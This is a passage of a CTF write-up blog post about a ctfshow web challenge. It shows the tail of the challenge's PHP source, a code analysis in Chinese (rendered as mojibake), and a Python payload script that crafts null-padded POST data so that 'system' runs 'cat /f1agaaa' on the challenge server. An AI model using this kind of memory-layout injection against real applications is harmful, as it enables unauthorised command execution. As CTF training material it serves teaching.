</span></span><span class="line"><span class="cl">        <span class="nx">array_shift</span><span class="p">(</span><span class="nv">$r</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$r</span> <span class="k">as</span> <span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkByte</span><span class="p">(</span><span class="nv">$s</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s2">&#34;Ref invalid!&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="k">function</span> <span class="nf">checkByte</span><span class="p">(</span><span class="nv">$check</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&lt;=</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_5</span> <span class="o">||</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&gt;=</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_2</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&gt;=</span><span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_3</span> <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_4</span> 
</span></span><span class="line"><span class="cl">            <span class="o">&amp;&amp;</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$check</span><span class="p">)</span> <span class="o">!==</span> <span class="nx">self</span><span class="o">::</span><span class="na">__REF_OFFSET_6</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;php://memory&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">readNeaten</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cache</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">C</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">main</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="1‰ª£Á†ÅÂàÜÊûê">1.‰ª£Á†ÅÂàÜÊûê</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ËøôÊÆµ‰ª£Á†ÅÂëΩÂêçÁ©∫Èó¥‰∏∫ctfshowÔºåÂÆÉÂÆö‰πâ‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ C ÁöÑÁ±ªÔºåÂπ∂‰∏îÂåÖÂê´‰∫Ü‰∏Ä‰∫õÂ∏∏ÈáèÂíåÊñπÊ≥ï„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CÁ±ªÔºö
</span></span><span class="line"><span class="cl">ÁßÅÊúâÊàêÂëòÂèòÈáè $cursorÔºöË°®Á§∫ÂΩìÂâçÁöÑÁºìÂÜ≤Âå∫ÊåáÈíà‰ΩçÁΩÆ„ÄÇ
</span></span><span class="line"><span class="cl">$cache ÊàêÂëòÂèòÈáèÔºåÊòØ‰∏Ä‰∏™ PHP Êñá‰ª∂Âè•ÊüÑÔºåÁî®‰∫éÂ≠òÂÇ®ÂíåËØªÂèñÊï∞ÊçÆ„ÄÇ
</span></span><span class="line"><span class="cl">Â∏∏Èáè __REF_OFFSET_1 Âà∞ __REF_OFFSET_6ÔºåÂÄºÈÉΩÊòØ‰∏Ä‰∏™Â≠óËäÇÔºåÁî®‰∫éÂêéÈù¢ÁöÑ‰∏Ä‰∫õÊìç‰Ωú„ÄÇ
</span></span><span class="line"><span class="cl">__REF_SIZE__ Âíå __REF_VAL_SIZE__ÔºåÂàÜÂà´Ë°®Á§∫ÂºïÁî®ÁöÑÂ§ßÂ∞èÂíåÂÄºÁöÑÂ§ßÂ∞è„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">main()ÊñπÊ≥ï‰ªé /flag Êñá‰ª∂‰∏≠ËØªÂèñ MD5 ÂÄºÔºåÂπ∂ÈÄöËøá define ÊñπÊ≥ïÂÆö‰πâ‰∫Ü‰∏§‰∏™ÂºïÁî® ctfshow Âíå flagÔºåÂàÜÂà´ÂØπÂ∫îÁî®Êà∑ POST ËØ∑Ê±Ç‰∏≠ÁöÑ data ÂíåÊñá‰ª∂ MD5 ÂÄº„ÄÇÁÑ∂ÂêéÂÆÉÈÄöËøá fill ÊñπÊ≥ïÂêëÁºìÂÜ≤Âå∫‰∏≠Â°´ÂÜôÊï∞ÊçÆ„ÄÇÊúÄÂêéÔºåÈÄöËøá read ÊñπÊ≥ïÊØîËæÉ‰∏§‰∏™ÂºïÁî®ÁöÑÂÄºÔºåÂ¶ÇÊûúÁõ∏Á≠âÂ∞±ËæìÂá∫ flag„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">define()ÊñπÊ≥ïÊ£ÄÊü•ÂºïÁî®ÁöÑÈïøÂ∫¶ÊòØÂê¶Ë∂ÖËøáÈôêÂà∂ÔºåÂπ∂Â∞ÜÂºïÁî®ÁöÑÂêçÁß∞ÂíåÂ§ßÂ∞èÂÜôÂÖ•ÁºìÂÜ≤Âå∫„ÄÇÁÑ∂ÂêéÂ°´ÂÜô‰∏Ä‰∏™Â≠óËäÇÁöÑ 0x31 ÂíåÂºïÁî®ÁöÑÂÄºÁöÑÂ§ßÂ∞èÔºå‰ª•Âèä‰∏Ä‰∏™ÊåáÂêëÊï∞ÊçÆÁöÑÊåáÈíà„ÄÇËøô‰∏™ÊñπÊ≥ïËøò‰ºöÂú®ÁºìÂÜ≤Âå∫‰∏≠ÂàÜÈÖç‰∏ÄÊÆµÁ©∫Èó¥Áî®‰∫éÂ≠òÂÇ®ÂºïÁî®ÁöÑÂÄº„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">fill()ÊñπÊ≥ï‰ºöÂ∞ÜÊï∞ÊçÆÂÜôÂÖ•ÁºìÂÜ≤Âå∫ÔºåÂπ∂Áî® 0x00 Â°´ÂÖÖÁºìÂÜ≤Âå∫ÁöÑÂâ©‰ΩôÈÉ®ÂàÜ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">read()ÊñπÊ≥ï‰ºöËØªÂèñÊåáÂÆöÂºïÁî®ÁöÑÂÄºÔºåÂπ∂ËøîÂõû„ÄÇÂÆÉ‰ºöÊ£ÄÊü•ÂºïÁî®ÊòØÂê¶Â≠òÂú®ÔºåÂπ∂‰ªéÁºìÂÜ≤Âå∫‰∏≠ËØªÂèñÂºïÁî®ÁöÑÂÄºÂíåÂ§ßÂ∞è„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">neaten()ÊñπÊ≥ï‰ºöÂú®ÁºìÂÜ≤Âå∫‰∏≠ÂàõÂª∫‰∏Ä‰∏™ _clear_ ÁöÑÂºïÁî®Âíå‰∏Ä‰∏™ÊåáÂêë C::clear ÊñπÊ≥ïÁöÑÊåáÈíàÔºåÂÆÉËøò‰ºöÂÜôÂÖ•‰∏Ä‰∫õÁ©∫Â≠óËäÇÁî®‰∫éÂØπÈΩê„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">readNeaten()ÊñπÊ≥ï‰ºö‰ªéÁºìÂÜ≤Âå∫‰∏≠ËØªÂèñ _clear_ ÁöÑÂÄºÔºåÂπ∂Ë∞ÉÁî® C::clear ÊñπÊ≥ï„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">write()ÊñπÊ≥ï‰ºöÂ∞ÜÊåáÂÆöÂÄºÂÜôÂÖ•ÁºìÂÜ≤Âå∫ÔºåÂπ∂Êõ¥Êñ∞ÁºìÂÜ≤Âå∫ÁöÑÊåáÈíà‰ΩçÁΩÆ„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">seek()ÊñπÊ≥ï‰ºöÂ∞ÜÁºìÂÜ≤Âå∫ÁöÑÊåáÈíà‰ΩçÁΩÆËÆæÁΩÆ‰∏∫ÂΩìÂâçÁöÑ $cursor„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">truncation()ÊñπÊ≥ï‰ºöÂ∞ÜÂ≠óËäÇ‰∏≤‰∏≠ÁöÑÁ©∫Â≠óËäÇÂéªÈô§„ÄÇ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">checkRef()ÊñπÊ≥ï‰ºöÊ£ÄÊü•ÂºïÁî®ÁöÑÈïøÂ∫¶ÊòØÂê¶Ë∂ÖËøáÈôêÂà∂ÔºåÂπ∂‰∏îÊ£ÄÊü•ÂºïÁî®ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶ÊòØÂê¶‰∏∫Êï∞Â≠ó„ÄÇÂ¶ÇÊûúÊ£ÄÊü•Â§±Ë¥•ÔºåÂÆÉ‰ºöÊäõÂá∫‰∏Ä‰∏™ÂºÇÂ∏∏„ÄÇ
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="2payload-1">2.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://e89d2c6d-e01e-4fef-9510-bf760aa69af6.challenge.ctf.show/&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;data&#34;</span><span class="p">:</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="s2">&#34;flag&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">19</span><span class="o">+</span><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">32</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">20</span><span class="o">+</span><span class="s2">&#34;system&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">18</span><span class="o">+</span><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">50</span><span class="o">+</span><span class="s2">&#34;flag&#34;</span><span class="err">Ôºö</span><span class="n">AÂ≠óÁ¨¶ÈáçÂ§ç</span> <span class="mi">50</span> <span class="n">Ê¨°</span><span class="err">Ôºå</span><span class="n">ÂÜçÊãºÊé•‰∏äÂ≠óÁ¨¶‰∏≤</span> <span class="s2">&#34;flag&#34;</span><span class="err">Ôºå</span><span class="n">Êª°Ë∂≥ÊúçÂä°Âô®ÂØπËæìÂÖ•Êï∞ÊçÆÈïøÂ∫¶ÁöÑÈôêÂà∂</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">19</span><span class="err">Ôºö</span><span class="n">Á©∫Â≠óÁ¨¶</span> <span class="p">(</span>\<span class="n">x00</span><span class="p">)</span> <span class="n">ÈáçÂ§ç</span> <span class="mi">19</span> <span class="n">Ê¨°</span><span class="err">Ôºå</span><span class="n">Ëøô‰∫õÁ©∫Â≠óÁ¨¶Áî®‰∫éÂ°´ÂÖÖÊï∞ÊçÆ</span><span class="err">Ôºå</span><span class="n">‰ΩøÂæóÊï∞ÊçÆÈïøÂ∫¶ËææÂà∞Ë¶ÅÊ±Ç</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mi">32</span><span class="err">Ôºö</span><span class="n">BÂ≠óÁ¨¶ÈáçÂ§ç</span> <span class="mi">32</span> <span class="n">Ê¨°</span><span class="err">Ôºå</span><span class="n">Êª°Ë∂≥ËæìÂÖ•ÈïøÂ∫¶ÁöÑÈôêÂà∂</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">20</span><span class="err">Ôºö</span><span class="n">Á©∫Â≠óÁ¨¶ÈáçÂ§ç</span> <span class="mi">20</span> <span class="n">Ê¨°</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;system&#34;</span><span class="err">Ôºö</span><span class="n">Ë°®Á§∫ÈúÄË¶ÅÊâßË°åÁ≥ªÁªüÂëΩ‰ª§</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">18</span><span class="err">Ôºö</span><span class="n">Á©∫Â≠óÁ¨¶ÈáçÂ§ç</span> <span class="mi">18</span> <span class="n">Ê¨°</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;cat /f1agaaa&#34;</span><span class="err">Ôºö</span><span class="n">ÈúÄË¶ÅÊâßË°åÁöÑÁ≥ªÁªüÂëΩ‰ª§</span><span class="err">Ôºå</span><span class="n">Âç≥ËØªÂèñ</span> <span class="o">/</span><span class="n">f1agaaa</span> <span class="n">Êñá‰ª∂ÁöÑÂÜÖÂÆπ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">8</span><span class="err">Ôºö</span><span class="n">Âä†‰∏ä</span> <span class="mi">8</span> <span class="n">‰∏™Á©∫Â≠óÁ¨¶Â°´ÂÖÖÊï∞ÊçÆ</span><span class="err">„ÄÇ</span>
</span></span><span class="line"><span class="cl"><span class="n">ÊûÑÈÄ†‰∏Ä‰∏™ÈïøÂ∫¶Á¨¶ÂêàË¶ÅÊ±ÇÁöÑÂ≠óÁ¨¶‰∏≤</span><span class="err">Ôºå</span><span class="n">Â∞ÜÂÖ∂‰∏≠ÁöÑÈÉ®ÂàÜÂÜÖÂÆπ‰Ωú‰∏∫Á≥ªÁªüÂëΩ‰ª§ËøõË°åÊâßË°å</span><span class="err">Ôºå</span><span class="n">‰ªéËÄåËé∑Âèñflag</span><span class="err">„ÄÇ</span>
</span></span></code></pre></td></tr></table>
</div>
</div>
</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/web/">web</a>
        
            <a href="/tags/ctf/">ctf</a>
        
            <a href="/tags/ctfshow/">ctfshow</a>
        
            <a href="/tags/%E6%84%9A%E4%BA%BA%E6%9D%AF/">ÊÑö‰∫∫ÊùØ</a>
        
            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ÂèçÂ∫èÂàóÂåñ</a>
        
            <a href="/tags/ssti/">SSTI</a>
        
            <a href="/tags/session/">session</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.css"integrity="sha256-J&#43;iAE0sgH8QSz9hpcDxXIftnj65JEZgNhGcgReTTK9s="crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/katex.min.js"integrity="sha256-InsNdER1b2xUewP&#43;pKCUJpkhiqwHgqiPXDlIk7GzBu4="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.15.6/dist/contrib/auto-render.min.js"integrity="sha256-y39Mpg7V3D4lhBX4x6O0bUqTV4pSrfgwEfGKfxkOdgI="crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>
    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/p/ctfshow-%E5%B9%B4ctf-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-Âπ¥CTF-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/ctfshow-%E6%96%B0%E6%89%8B%E6%9D%AF-web/">
        
        

        <div class="article-details">
            <h2 class="article-title">ctfshow-Êñ∞ÊâãÊùØ-web</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
        
        

        <div class="article-details">
            <h2 class="article-title">‰ø°ÊÅØÊî∂ÈõÜ</h2>
        </div>
    </a>
</article>

            
                
<article class="">
    <a href="/p/parse_url/">
        
        

        <div class="article-details">
            <h2 class="article-title">PARSE_URL</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script src="https://utteranc.es/client.js" 
        repo="Relish1one/blog_data"
        issue-term="pathname"
        
        label="none"
        
        crossorigin="anonymous"
        async
        >
</script>

<style>
    .utterances {
        max-width: unset;
    }
</style>

<script>
    let utterancesLoaded = false;

    function setUtterancesTheme(theme) {
        let utterances = document.querySelector('.utterances iframe');
        if (utterances) {
            utterances.contentWindow.postMessage(
                {
                    type: 'set-theme',
                    theme: `github-${theme}`
                },
                'https://utteranc.es'
            );
        }
    }

    addEventListener('message', event => {
        if (event.origin !== 'https://utteranc.es') return;

        
        utterancesLoaded = true;
        setUtterancesTheme(document.documentElement.dataset.scheme)
    });

    window.addEventListener('onColorSchemeChange', (e) => {
        if (!utterancesLoaded) return;
        setUtterancesTheme(e.detail)
    })
</script>


    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2022 - 
        
        2023 R1one&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

<script
    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/ribbon.min.js"
    integrity="sha384-UEK8ZiP3VgFNP8KnKMKDmd4pAUAOJ59Y2Jo3ED2Z5qKQf6HLHovMxq7Beb9CLPUe"
    crossorigin="anonymous"
    size="300"
    alpha="0.6"
    zindex="-1"
    defer
></script>

<script
    src="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/js/nprogress.min.js"
    integrity="sha384-bHDlAEUFxsRI7JfULv3DTpL2IXbbgn4JHQJibgo5iiXSK6Iu8muwqHANhun74Cqg"
    crossorigin="anonymous"
></script>
<link
    rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/zhixuan2333/gh-blog@v0.1.0/css/nprogress.css"
    integrity="sha384-KJyhr2syt5+4M9Pz5dipCvTrtvOmLk/olWVdfhAp858UCa64Ia5GFpTN7+G4BWpE"
    crossorigin="anonymous"
/>
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>

    </body>
</html>
